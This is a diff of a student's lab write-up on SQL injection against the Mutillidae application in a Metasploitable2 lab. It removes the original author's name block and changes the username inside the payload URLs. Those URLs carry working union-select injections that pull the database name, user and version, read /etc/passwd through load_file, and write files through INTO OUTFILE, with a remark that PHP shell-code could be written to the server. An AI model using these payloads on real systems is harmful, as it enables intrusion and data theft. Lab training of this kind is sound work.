@@ -1,11 +1,7 @@
 # sqlinjection
 Exploiting SQL Injection vulnerability
 
-```
-NAME : SANKAR S
-REG NO : 212224040291
-DEPT : CSE
-```
+
 # AIM:
 To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2
 
@@ -151,11 +147,11 @@ Instead of using the "order by" option, let’s use the "union select" option an
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 
 
-http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=sannkar2%27union%20select%201,2,3,4,5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=Naveen kumarr2%27union%20select%201,2,3,4,5%23&password=&user-info-php-submit-button=View+Account+Details
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=sannkar2%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=Naveen kumar2%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
 
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.
@@ -187,7 +183,7 @@ http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=sannkar2
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=sannkar2%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.176.150/mutillidae/index.php?page=user-info.php&username=Naveen kumar2%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’)..
 
